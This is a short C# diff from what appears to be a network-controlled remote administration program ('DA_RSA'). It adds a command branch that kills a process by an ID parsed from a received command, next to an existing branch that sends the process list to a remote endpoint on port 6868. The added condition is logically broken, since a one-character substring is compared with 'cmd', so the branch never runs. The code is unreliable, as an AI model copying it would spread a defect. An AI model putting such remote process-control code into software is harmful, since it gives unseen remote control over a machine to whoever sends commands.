@@ -108,9 +108,10 @@ namespace DA_RSA
                             ipep.Port = 6868;
                             getProcessList(ipep.Address, ipep.Port);//get process
                         }
-                        else if (cmd == "d")
-                        { 
-                        //get kill process name
+                        else if (cmd.Substring(0,1) == "cmd")
+                        {
+                            Process p = Process.GetProcessById(Convert.ToInt32(cmd.Substring(1)));
+                            p.Kill();
                         }
                         //string tmp = Environment.GetFolderPath(Environment.SpecialFolder.History);
                     }
